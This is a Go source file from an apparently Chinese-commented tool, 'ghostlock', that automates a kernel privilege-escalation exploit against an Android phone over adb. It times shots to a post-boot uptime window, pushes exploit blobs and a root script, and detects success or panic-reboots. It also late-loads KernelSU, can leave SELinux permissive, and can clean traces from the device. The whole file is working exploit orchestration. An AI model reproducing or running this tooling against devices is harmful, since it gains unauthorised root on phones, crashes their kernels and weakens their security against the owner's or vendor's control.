package run

import (
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"ghostlock/internal/assets"
	"ghostlock/internal/device"
	"ghostlock/internal/ko"
	"ghostlock/internal/profile"
	"ghostlock/internal/stage"
)

// LoopOptions drives the unattended mode: fire, wait for the phone to reboot
// after a miss, fire again as soon as it is back inside the uptime window.
//
// The gate matters. The exploit only lands reliably in the first tens of
// seconds after boot, so an attempt on a phone that has been up for an hour is
// a guaranteed miss (and a reboot).
type LoopOptions struct {
	Base        *Options
	Rounds      int  // 轮数上限，0 = 不限
	PerBoot     int  // 每次开机窗口内连发几次
	Window      int  // uptime 窗口上沿（秒）：v1.1 明文是 90
	MinUptime   int  // 下沿（秒），0 = 不等；见 README 的实测数据
	Timeout     int  // 单次发射等待（秒）
	CycleWait   int  // 等设备自己重启（秒）
	RebootFirst bool // 先主动重启再打
	AutoReboot  bool // 一轮干净失败（没有 panic）时，主动重启进下一轮
	Out         io.Writer
}

func (lo *LoopOptions) printf(f string, a ...any) {
	if lo.Out != nil {
		fmt.Fprintf(lo.Out, f, a...)
	}
}

// ksuEnforce is the one place that decides what the root script is allowed to
// do. Both the direct path (buildCommand) and the loop path (staged runScript)
// read it, so --temp-root cannot be silently dropped by the loop again.
func ksuEnforce(o *Options) int {
	if o.TempRoot {
		return 9
	}
	if o.Permissive {
		return 0
	}
	// 1 = late-load but leave SELinux alone. Leaving the phone permissive is
	// what the old default did; the boots where we did it are the ones where
	// vivo's own init aborted, so enforcing is the default now.
	return 1
}

// loadKo resolves, validates and reads a kernelsu module the user picked.
func loadKo(selector, kernelRelease string) ([]byte, string, string, error) {
	mod, err := ko.Resolve(selector, ko.DefaultDir())
	if err != nil {
		return nil, "", "", err
	}
	ok, why := mod.Compatible(kernelRelease)
	if !ok {
		return nil, "", "", fmt.Errorf("%s：%s", mod.File, why)
	}
	data, err := os.ReadFile(mod.Path)
	if err != nil {
		return nil, "", "", err
	}
	return data, mod.File, why, nil
}

// Loop runs the unattended retry loop and returns the first winning result.
func Loop(lo *LoopOptions) (*Result, error) {
	o := lo.Base
	if o == nil {
		return nil, fmt.Errorf("loop 缺少基础参数")
	}
	if lo.Out != nil {
		o.Out = lo.Out
	}
	if lo.Rounds <= 0 {
		lo.Rounds = 10
	}
	if lo.PerBoot <= 0 {
		// One shot per boot. A second shot inside the same boot is what
		// panics the kernel about a minute after the first one succeeded;
		// see the `fired` comment in Loop.
		lo.PerBoot = 1
	}
	if lo.Window <= 0 {
		lo.Window = 90
	}
	if lo.Timeout <= 0 {
		lo.Timeout = 180
	}
	if v := os.Getenv("GHOSTLOCK_MIN_UPTIME"); v != "" && lo.MinUptime == 0 {
		fmt.Sscanf(v, "%d", &lo.MinUptime)
	}
	if lo.CycleWait <= 0 {
		lo.CycleWait = 600
	}

	facts, err := stage.Probe(o.ADB)
	if err != nil {
		return nil, err
	}
	lo.printf("• 设备    %s (%s) android %s, kernel %s"+nl, facts.Model, facts.Product, facts.AndroidVer, facts.KernelRelease)
	lo.printf("• selinux %s   kmi %s"+nl, facts.Selinux, orDash(facts.Kmi))

	// --reboot-first must happen before the root check: a reboot is exactly how
	// you clear a previous late-load, so checking first would skip the run.
	if lo.RebootFirst && o.ADB.IsRoot() {
		lo.printf(nl + "[i] 设备当前是 root（上次 late-load 还在），先重启清掉再打" + nl)
		if err := o.ADB.Reboot(); err != nil {
			return nil, err
		}
		if facts, err = stage.Probe(o.ADB); err != nil {
			return nil, err
		}
		lo.RebootFirst = false
	}
	if o.ADB.IsRoot() {
		lo.printf(nl + "[+] 设备已经是 root（su 可用），不用再打。" + nl)
		return &Result{KsuLoaded: true, TempRoot: true}, nil
	}

	var blob []byte
	if o.BlobPath == "" && o.ConfPath == "" {
		if b, ok := verifiedBlob(o, facts.KernelRelease); ok {
			blob = b
			lo.printf("• blob    内嵌已验证 profile（%d 字节）"+nl, len(b))
		}
	}
	if blob != nil {
		// already resolved
	} else if o.BlobPath != "" {
		b, rel, err := loadBlob(o.BlobPath, facts.KernelRelease)
		if err != nil {
			return nil, err
		}
		blob = b
		lo.printf("• blob    %s（release %s，%d 字节）"+nl, o.BlobPath, rel, len(b))
	} else {
		p, confName, err := resolveProfile(o, facts)
		if err != nil {
			return nil, err
		}
		if problems := p.Validate(); len(problems) > 0 {
			for _, prob := range problems {
				lo.printf("  ! %s"+nl, prob)
			}
			return nil, fmt.Errorf("profile 不可用，拒绝上机")
		}
		b, err := p.Encode()
		if err != nil {
			return nil, err
		}
		blob = b
		lo.printf("• profile %s (route %s)"+nl, confName, p.Route)
	}

	manager := o.ManagerPkg
	if manager == "" {
		manager = facts.ManagerPkg
	}
	kmi := o.Kmi
	if kmi == "" {
		kmi = facts.Kmi
	}

	var userKo []byte
	if o.KoPath != "" {
		data, name, why, err := loadKo(o.KoPath, facts.KernelRelease)
		if err != nil {
			return nil, err
		}
		userKo = data
		lo.printf("• ko      %s（%s）→ 走 ksud wrapper：先 insmod 它，再跑正常 late-load"+nl, name, why)
	}

	// 管理器包名只解析一次（此时设备在跑，pm 可用）。绝不能放在每轮发射前：
	// 那会给发射路径塞进最多十几秒的探测开销，直接把 uptime 时机毁掉。
	if o.ManagerPkg == "" {
		if pkg, rerr := stage.RefreshManager(o.ADB, o.Remote, ""); rerr == nil && pkg != "" {
			manager = pkg
			lo.printf("• manager %s（已写入 .gl_ksu_pkg）"+nl, pkg)
		} else {
			lo.printf("! 没能确定管理器包名，内核里 manager uid 会留 0" + nl)
		}
	}

	files, err := stage.Push(o.ADB, stage.Options{
		Loader:      o.Loader,
		Remote:      o.Remote,
		ProfileBlob: blob,
		ManagerPkg:  manager,
		Kmi:         kmi,
		WithVrPatch: !o.NoVrPatch,
		UserKo:      userKo,
		RunScript:   true,
		ForceAttack: true,
		KsuEnforce:  ksuEnforce(o),
	})
	if err != nil {
		return nil, err
	}
	if files.KsudWrapper != "" {
		lo.printf("• ksud    wrapper 就位：%s"+nl, files.KsudWrapper)
	}
	if manager == "" {
		lo.printf("! 没有安装 KSU 系管理器：late-load 没人接管，root 留不住" + nl)
	}

	if lo.RebootFirst {
		lo.printf(nl + "[*] 先重启，抢开机窗口…" + nl)
		if err := o.ADB.Reboot(); err != nil {
			return nil, err
		}
	}

	lo.printf(nl+"[i] 最多 %d 轮 × 每轮 %d 次；uptime 窗口 %ds；失败由手机自己重启"+nl,
		lo.Rounds, lo.PerBoot, lo.Window)

	// fired is the boot_id of the boot this loop has already shot at. One shot
	// per boot is a hard rule: the second one writes W2 into a kernel that
	// already carries the late-loaded module and panics ~60s later, taking the
	// root that the first shot had just produced down with it. Field data:
	// every "root was up then died" run fired twice on one boot; the run that
	// fired once at uptime 34s stayed alive past 500s.
	fired := ""

	for r := 1; r <= lo.Rounds; r++ {
		lo.printf(nl+"================ 第 %d/%d 轮 ================"+nl, r, lo.Rounds)

		// 关键：失败本身会让内核 panic 并自动重启（这就是这个 bug 的表现），
		// 所以绝对不能每轮再手动 adb reboot —— 手动重启后 adb 恢复得比 panic
		// 重启快，会在 uptime 11~13s 就发射，而那时基本打不中。正确做法是
		// panic 之后等设备自己起来，等它回来时 uptime 自然落在 30~50s。
		if r == 1 && lo.RebootFirst {
			lo.printf("[*] 首次主动重启（清掉可能残留的旧 late-load）" + nl)
			if err := o.ADB.Reboot(); err != nil {
				lo.printf("[!] 重启后没等到设备: %v"+nl, err)
			}
		}
		if !o.ADB.WaitShell(180 * time.Second) {
			lo.printf("[!] 180s 没等到 adb shell，跳过本轮" + nl)
			continue
		}
		if id := o.ADB.BootID(); id != "" && id == fired {
			lo.printf("[i] 这个 boot 已经打过一次，不再重复发射（二次发射会打死内核）—— 重启换 boot" + nl)
			if err := o.ADB.Reboot(); err != nil {
				lo.printf("[!] 重启失败: %v"+nl, err)
			}
			continue
		}
		up, err := o.ADB.Uptime()
		if err != nil {
			lo.printf("[!] 读不到 uptime: %v"+nl, err)
			continue
		}
		lo.printf("[i] uptime=%.0fs"+nl, up)
		if lo.MinUptime > 0 && int(up) < lo.MinUptime {
			wait := lo.MinUptime - int(up)
			lo.printf("[i] 等 %ds 让 uptime 到 %ds"+nl, wait, lo.MinUptime)
			time.Sleep(time.Duration(wait) * time.Second)
			if up, err = o.ADB.Uptime(); err != nil {
				continue
			}
			lo.printf("[i] uptime=%.0fs"+nl, up)
		}
		if int(up) > lo.Window {
			// Waiting for adb is useless here: the device is alive and will
			// stay past the window forever. Only a real reboot puts us back
			// inside it, and without it every remaining round burns in
			// seconds reading the same out-of-window uptime.
			lo.printf("[i] 已超出窗口 %ds，主动重启再打"+nl, lo.Window)
			if err := o.ADB.Reboot(); err != nil {
				lo.printf("[!] 重启失败: %v"+nl, err)
			}
			continue
		}

		dropped := false
		for n := 1; n <= lo.PerBoot; n++ {
			// Re-check the boot window before every shot: a clean miss costs
			// ~20s and the box can drift past the window, where the race never
			// lands. Reboot instead of burning shots outside it.
			if n > 1 {
				if up2, e := o.ADB.Uptime(); e == nil {
					up = up2
				}
				if int(up) > lo.Window {
					lo.printf("[i] 已超出窗口 %ds，本轮剩下的发射改为重启后再打"+nl, lo.Window)
					break
				}
			}
			lo.printf("---- 第 %d 轮 / 第 %d 次（uptime=%.0fs）----"+nl, r, n, up)
			// Remember the boot before the shot, not after: when the shot
			// kills the kernel this loop never gets to write it down.
			if id := o.ADB.BootID(); id != "" {
				fired = id
			}
			res := fire(o.ADB, files, lo.Timeout, lo.printf)
			if res.Won {
				if o.CleanAfter {
					if gone, cerr := stage.Clean(o.ADB, stage.CleanOptions{Remote: o.Remote}); cerr == nil {
						lo.printf(nl+"[*] 已清理设备痕迹: %s"+nl, strings.Join(gone, ", "))
					}
				}
				lo.printf(nl + "[+] 成功：root 已在（KernelSU late-load）" + nl)
				lo.printf("    用法: adb shell su -c id" + nl)
				lo.printf("    注意: late-load 只在内存里，硬重启就没了，重启后重跑。" + nl)
				return &Result{TempRoot: true, KsuLoaded: true, SelinuxOff: true}, nil
			}
			if res.Tail != "" {
				lo.printf("    %s"+nl, res.Tail)
			}
			if res.Dropped {
				dropped = true
				lo.printf("[!] 连接掉了（多半是 panic 重启）—— 等设备自己回来" + nl)
				// A drop is not proof of failure: the hand-off often wins
				// right before the transport goes away. Ask the device until
				// the module shows up — a single early probe was the false
				// miss that turned one shot into two.
				if o.ADB.WaitShell(180 * time.Second) {
					// A new boot_id means the phone did reboot, so there is
					// no hand-off left to wait for: skip the 90s poll.
					if id := o.ADB.BootID(); id != "" && fired != "" && id != fired {
						lo.printf("[i] 设备已换 boot（真重启了），本次发射失手" + nl)
					} else if confirmRoot(o.ADB, 90*time.Second, lo.printf) {
						lo.printf(nl + "[+] 成功：设备回来后 su 已可用（KernelSU late-load）" + nl)
						lo.printf("    用法: adb shell su -c id" + nl)
						return &Result{TempRoot: true, KsuLoaded: true, SelinuxOff: true}, nil
					}
				}
				break
			}
			if n+1 <= lo.PerBoot {
				if up2, e := o.ADB.Uptime(); e == nil {
					up = up2
				}
			}
		}

		if !dropped {
			// 干净退出（没 panic）不会触发自动重启，这里才需要我们自己重启。
			lo.printf("[i] 本轮没中（干净退出），主动重启进下一轮" + nl)
			if err := o.ADB.Reboot(); err != nil {
				lo.printf("[!] 重启失败: %v"+nl, err)
			}
		} else {
			lo.printf("[i] 等 panic 重启完成…" + nl)
			if !o.ADB.WaitShell(180 * time.Second) {
				lo.printf("[!] 设备没回来，主动重启" + nl)
				_ = o.ADB.Reboot()
			}
		}
	}
	return &Result{Notes: []string{"轮数用尽"}}, nil
}

type fireResult struct {
	Won     bool
	Dropped bool
	Tail    string
}

// fire launches one attempt in the background and watches its KSU log for the
// success marker, while detecting the panic/reboot a miss causes.
func fire(a *device.ADB, f *stage.Files, timeout int, say func(string, ...any)) *fireResult {
	ts := fmt.Sprintf("%d", time.Now().UnixNano()/int64(time.Millisecond))
	launch := fmt.Sprintf("cd %s && GL_RUN_ID=%s setsid sh %s </dev/null >/dev/null 2>&1 & echo go",
		f.Remote, ts, f.RunScript)
	if _, err := a.Shell(launch); err != nil {
		return &fireResult{Dropped: true}
	}
	ksuLog := f.Remote + "/ksu-" + ts + ".log"
	nativeLog := f.Remote + "/native-" + ts + ".log"
	rcFile := f.Remote + "/native-" + ts + ".rc"

	res := &fireResult{}
	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
	handoff := false
	for time.Now().Before(deadline) {
		time.Sleep(700 * time.Millisecond)
		// Read the log BEFORE probing liveness. During hand-off the phone runs
		// at load 30+ and `echo up` can miss three deadlines on a kernel that
		// has already won; probing first therefore threw away a real win and
		// forced the loop to wait for the next reboot to confirm it.
		klog, _ := a.ShellTrim("cat " + ksuLog + " 2>/dev/null")
		if strings.Contains(klog, "KernelSU module loaded") {
			res.Won = true
			return res
		}
		if strings.Contains(klog, "fixup failed") ||
			strings.Contains(klog, "KernelSU module not loaded") ||
			strings.Contains(klog, "ksud missing") {
			res.Tail = lastLine(klog)
			return res
		}
		if strings.Contains(klog, "root script start") {
			if !handoff {
				handoff = true
				deadline = time.Now().Add(120 * time.Second)
				say("    [i] root 脚本已启动（uid0），等 policy / vrpatch / late-load")
			}
			// The ksu log is the intent; `su -c id` is the fact. Late-load can
			// finish without the log line (the script is killed when adb drops
			// the session), so accept a live root shell as success too.
			if out, err := a.ShellTrim("su -c id 2>/dev/null"); err == nil &&
				strings.Contains(out, "uid=0") {
				res.Won = true
				return res
			}
			// Fall through to the liveness probe: if the su call failed because
			// the kernel just went down, this is a drop, not a slow hand-off.
		}
		if out, _ := a.Shell("test -f " + rcFile + " && echo y"); strings.Contains(out, "y") {
			// native 退出了，但 root 脚本是它 fork 出去的后台进程，日志往往
			// 晚几秒才写完。所以不能只看 ksu log —— 直接问内核：模块在不在。
			if rooted(a) {
				res.Won = true
				return res
			}
			time.Sleep(3 * time.Second)
			if klog2, _ := a.ShellTrim("cat " + ksuLog + " 2>/dev/null"); strings.Contains(klog2, "KernelSU module loaded") || rooted(a) {
				res.Won = true
				return res
			}
			nlog, _ := a.ShellTrim("tail -n 3 " + nativeLog + " 2>/dev/null")
			res.Tail = lastLine(nlog)
			return res
		}
		if !a.AliveFast() {
			// One last look: adb can die the instant after the win is logged.
			if klog2, _ := a.ShellTrim("cat " + ksuLog + " 2>/dev/null"); strings.Contains(klog2, "KernelSU module loaded") {
				res.Won = true
				return res
			}
			res.Dropped = true
			return res
		}
	}
	return res
}

// lastLine keeps the last non-empty line, trimmed, for the live progress line.
func lastLine(s string) string {
	out := ""
	for _, l := range strings.Split(s, nl) {
		l = strings.TrimSpace(stripANSI(l))
		if l != "" {
			out = l
		}
	}
	if len(out) > 160 {
		out = out[:160]
	}
	return out
}

// stripANSI removes the color escapes the native binary emits.
func stripANSI(s string) string {
	for {
		i := strings.Index(s, string([]byte{0x1b})+"[")
		if i < 0 {
			return s
		}
		j := i + 2
		for j < len(s) && (s[j] < 0x40 || s[j] > 0x7e) {
			j++
		}
		if j < len(s) {
			j++
		}
		s = s[:i] + s[j:]
	}
}

// loadBlob reads a ready-made profile blob and checks it was built for this
// exact kernel. A foreign release means every offset inside is wrong.
func loadBlob(path, kernelRelease string) ([]byte, string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, "", err
	}
	d, err := profile.Decode(data)
	if err != nil {
		return nil, "", fmt.Errorf("%s: %w", path, err)
	}
	if d.Release != kernelRelease {
		return nil, "", fmt.Errorf("blob 的 release 是 %q，设备是 %q —— 偏移会对不上", d.Release, kernelRelease)
	}
	return data, d.Release, nil
}

// verifiedBlob returns the profile blob that was field-tested on this exact
// kernel, if one is bundled and its release matches.
func verifiedBlob(o *Options, kernelRelease string) ([]byte, bool) {
	if o.Loader == nil {
		return nil, false
	}
	data, err := o.Loader.Read(assets.VerifiedBlobName)
	if err != nil {
		return nil, false
	}
	d, err := profile.Decode(data)
	if err != nil || d.Release != kernelRelease {
		return nil, false
	}
	return data, true
}

// rooted asks the device itself whether the late-load already landed. The
// exploit can succeed while its own stdout/log never says so (the root script
// runs detached and is killed by the panic moments later).
func rooted(a *device.ADB) bool {
	if a.HasModule("kernelsu") {
		return true
	}
	return a.IsRoot()
}

// confirmRoot waits for a late-load that may have landed while adb was down.
//
// The hand-off is exactly when the phone stops answering: the root script is
// forked off the winning thread and adb loses the transport for a few seconds.
// The old code asked `su -c id` once, right after the transport came back, and
// declared a miss when the module had not finished loading yet. That false miss
// is what made the loop fire a second shot on the same boot, and the second
// shot is what panics the kernel ~60s later.
//
// HasModule is the cheap probe (no su spawn); it is also the one that turns
// true first, since KernelSU lists itself in /proc/modules as it loads.
func confirmRoot(a *device.ADB, budget time.Duration, say func(string, ...any)) bool {
	deadline := time.Now().Add(budget)
	announced := false
	for time.Now().Before(deadline) {
		if a.HasModule("kernelsu") {
			if a.IsRoot() {
				return true
			}
			// Module is in, su not answering yet: keep waiting, the
			// policy hand-off is still finishing.
		} else if !announced {
			announced = true
			say("    [i] 掉线后确认中：模块还没进 /proc/modules，继续等（最多 %s）", budget)
		}
		time.Sleep(3 * time.Second)
	}
	return a.HasModule("kernelsu") || a.IsRoot()
}
